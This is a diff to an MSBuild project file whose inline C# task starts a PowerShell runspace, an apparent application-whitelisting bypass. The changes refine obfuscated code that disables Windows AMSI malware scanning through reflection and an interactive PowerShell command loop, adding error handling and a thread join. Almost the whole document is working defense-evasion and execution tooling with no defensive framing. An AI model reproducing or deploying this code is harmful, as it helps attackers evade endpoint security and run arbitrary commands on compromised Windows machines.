@@ -8,17 +8,19 @@
     <Reference Include="System.Data" />
     <Reference Include="System.Net" />
     <Reference Include="System.Xml" />
+    <Reference Include="System.Management.Automation" />
   </ItemGroup>
   <Target Name="Hello">
-    <ClassExample/>
+    <ClassExample />
   </Target>
-  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
-      <Using Namespace="System"/>
-      <Using Namespace="System.Reflection"/>
-      <Using Namespace="System.Diagnostics"/>
-      <Using Namespace="System.Net"/>
-      <Using Namespace="System.Management.Automation"/>
+      <Using Namespace="System" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Diagnostics" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.Management.Automation" />
       <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
@@ -39,8 +41,8 @@
                 Thread powerShellThread = new Thread(RunPowerShell);
                 powerShellThread.Start();
                 
-                // Optionally, wait for the thread to finish, if needed
-                // powerShellThread.Join();
+                // Wait for the thread to complete to ensure proper execution
+                powerShellThread.Join();
                 return true;
             }
 
@@ -54,7 +56,7 @@
 
                 Console.WriteLine("PS " + currentDirectory + ">");
 
-                // Updated AMSI bypass code
+                // AMSI bypass code with escaped $ characters
                 string amsiBypass = @"
                 $A=""5492868772801748688168747280728187173688878280688776828""
                 $B=""1173680867656877679866880867644817687416876797271""
@@ -65,27 +67,37 @@
                 SetValue($null,$true)
                 ";
 
-                // Add the AMSI bypass script to the session
-                ps.AddScript(amsiBypass);
-                ps.Invoke();
+                // Execute AMSI bypass
+                try
+                {
+                    ps.AddScript(amsiBypass);
+                    ps.Invoke();
+                    ps.Commands.Clear();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("ERROR: Failed to apply AMSI bypass: " + e.Message);
+                    rs.Close();
+                    return;
+                }
 
+                // Interactive PowerShell loop
                 while (true)
                 {
-                    // Print the prompt first
                     Console.Write("PS " + currentDirectory + "> ");
                     string cmd = Console.ReadLine();
                     if (string.IsNullOrWhiteSpace(cmd)) continue;
 
                     try
                     {
-                        // Handle 'exit' command separately
+                        // Handle 'exit' command
                         if (cmd.Trim().ToLower() == "exit")
                         {
                             Console.WriteLine("Exiting PowerShell session...");
-                            break;  // Breaks the loop and ends the session
+                            break;
                         }
 
-                        // Handle directory navigation commands
+                        // Handle directory navigation
                         if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
                         {
                             string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
@@ -93,7 +105,8 @@
                             {
                                 Directory.SetCurrentDirectory(targetPath);
                                 currentDirectory = Directory.GetCurrentDirectory();
-                                ps.AddScript(string.Format("Set-Location \"{0}\"", currentDirectory)).Invoke();
+                                ps.AddScript("Set-Location \"" + currentDirectory + "\"").Invoke();
+                                ps.Commands.Clear();
                             }
                             else
                             {
@@ -102,48 +115,43 @@
                             continue;
                         }
 
-                        // Capture output for all commands (including cmdlets and tools like iex)
+                        // Execute the command and capture output
                         ps.AddScript(cmd + " | Out-String");
-
-                        // Execute the script
                         Collection<PSObject> psOutput = ps.Invoke();
                         Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
 
-                        // Handle errors if any
+                        // Handle errors
                         if (errors.Count > 0)
                         {
-                            Console.WriteLine(); // Blank line before error output
+                            Console.WriteLine();
                             foreach (ErrorRecord error in errors)
                             {
                                 Console.WriteLine("ERROR: " + error.ToString());
                             }
                         }
 
-                        // Capture standard output (including cmdlet outputs)
+                        // Display output
                         if (psOutput.Count > 0)
                         {
-                            Console.WriteLine(); // Blank line before output
+                            Console.WriteLine();
                             foreach (PSObject output in psOutput)
                             {
                                 if (output != null)
                                 {
-                                    // Ensure the output is converted to a string and displayed
                                     Console.WriteLine(output.ToString());
                                 }
                             }
                         }
-
                     }
                     catch (Exception e)
                     {
-                        Console.WriteLine(); // Blank line before error message
+                        Console.WriteLine();
                         Console.WriteLine("**** ERROR ****");
                         Console.WriteLine(e.Message);
                     }
                     finally
                     {
                         ps.Commands.Clear();
-                        Console.WriteLine();
                     }
                 }
 
